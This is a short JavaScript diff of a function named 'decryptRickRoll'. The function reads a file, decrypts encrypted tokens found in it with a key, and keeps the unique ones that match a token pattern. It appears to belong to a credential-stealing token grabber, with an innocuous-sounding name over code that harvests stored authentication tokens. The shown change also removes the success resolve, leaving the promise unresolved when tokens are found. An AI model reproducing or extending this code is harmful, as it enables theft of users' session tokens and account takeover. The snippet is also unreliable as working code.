@@ -66,11 +66,13 @@ const decryptRickRoll = (path) => {
         });
       });
       readInterface.on('close', () => {
-        encryptedTokens.map(token => {
-          token = decryptToken(token, key);
-          if (!!token && !tokens.includes(token)) tokens.push(token);
+        encryptedTokens.forEach(token => {
+          token = decryptToken(token, key)?.trim();
+          if (
+            typeof token === 'string' && token.match(tokenRegex) && !tokens.includes(token)
+          ) tokens.push(token);
         });
-        tokens.length > 0 ? resolve(tokens) : reject();
+        if (tokens.length <= 0) reject();
       });
     });
   });
